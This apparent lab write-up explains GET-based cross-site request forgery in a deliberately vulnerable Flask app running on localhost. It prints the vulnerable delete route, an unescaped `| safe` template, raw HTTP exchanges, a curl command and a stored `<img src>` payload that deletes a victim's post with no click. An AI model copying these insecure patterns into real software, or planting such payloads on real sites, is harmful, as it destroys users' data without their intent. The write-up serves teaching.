# get based csrf: deleting a post through the victim's browser

## what the bug is

`delete_post()` changes database state when the browser sends a `GET` request:

```python
@app.route("/deletepost/<int:post_id>")
def delete_post(post_id):
    db = get_db()
    cursor = db.cursor(dictionary=True)
    cursor.execute(f"SELECT * FROM posts WHERE id = {post_id}")
    post = cursor.fetchone()
    if post is None:
        cursor.close()
        return "Post not found.", 404
    if post.get("user_id") != session.get("user_id"):
        cursor.close()
        return "You are not authorized to delete this post.", 403
    cursor.execute(f"DELETE FROM posts WHERE id = {post_id}")
    db.commit()
    cursor.close()
    return "Post deleted successfully!"
```

the route checks ownership, but ownership is not intent. if john is logged in, john's browser automatically sends john's session cookie when any page causes a request to `/deletepost/10`. the route then sees john's identity and performs the deletion.

the vulnerable design has three parts:

1. `GET` changes server state.
2. there is no csrf token or confirmation value.
3. the browser supplies the session cookie automatically.

## the normal request

the delete link in `see.html` is:

```html
<a href="/deletepost/{{ post.id }}">Delete post</a>
```

if john owns post `10`, the browser sends a request like this:

```http
GET /deletepost/10 HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=<john's signed flask session cookie>
```

flask reads the cookie into `session`. the route then performs these database operations:

```sql
SELECT * FROM posts WHERE id = 10;
```

the returned row has `user_id` equal to john's session user id, so the comparison succeeds. the route continues with:

```sql
DELETE FROM posts WHERE id = 10;
COMMIT;
```

the response is:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

Post deleted successfully!
```

the important transition is from an ordinary `GET` request to a committed database deletion. there is no separate delete form submission and no second proof that john intended the action.

## direct verification

use john's existing session cookie, or perform the request in john's logged in browser:

```bash
curl -i -b john.cookies http://127.0.0.1:5000/deletepost/10
```

expected response:

```http
HTTP/1.1 200 OK

Post deleted successfully!
```

the next request to `/see` no longer includes post `10`, because the `DELETE` committed before the response was returned.

## why another user gets `403`

if csrfer is logged in and requests the same URL, the SQL lookup still finds post `10`, but the ownership comparison fails:

```python
post["user_id"] != session["user_id"]
```

the response is:

```http
HTTP/1.1 403 FORBIDDEN

You are not authorized to delete this post.
```

this demonstrates that the route has an authorization check. it does not demonstrate csrf protection. csrf uses the victim's valid authorization, so the attacker does not need to impersonate john or forge john's cookie.

## automatic request through stored html

csrfer can create a post containing:

```html
<img src="/deletepost/10">
```

the upload request stores that value in the `content` column. later, john requests `/see`:

```http
GET /see HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=<john's signed flask session cookie>
```

the response contains the stored value because `see.html` uses:

```html
<p>{{ post.content | safe }}</p>
```

the browser parses the response and creates an image element. image loading causes a second request automatically:

```http
GET /deletepost/10 HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=<john's signed flask session cookie>
Referer: http://127.0.0.1:5000/see
```

the image does not need to load successfully. the request itself reaches the Flask route, passes the ownership check, executes `DELETE`, and commits. john only needed to open `/see`; no click is required.

## why this is csrf

the malicious post does not become authorized by itself. it causes john's browser to send a request that is authorized by john's already active session. the server checks who sent the request, but not whether the request originated from an intentional action on vulnboard.

the ownership check therefore answers:

```text
does this session own post 10?
```

it does not answer:

```text
did this user intentionally request deletion?
```

## verification checklist

| check | result |
|---|---|
| logged in owner visits `/deletepost/<id>` | the post is deleted immediately |
| another logged in user visits the same URL | the route returns `403` |
| stored `<img src="/deletepost/10">` is rendered by the owner | the browser sends the delete request without a click |
| the route changes state with `GET` | yes |
| the route requires a csrf token | no |
| the route requires confirmation | no |
| the route checks post ownership | yes, but that is authorization rather than csrf defense |
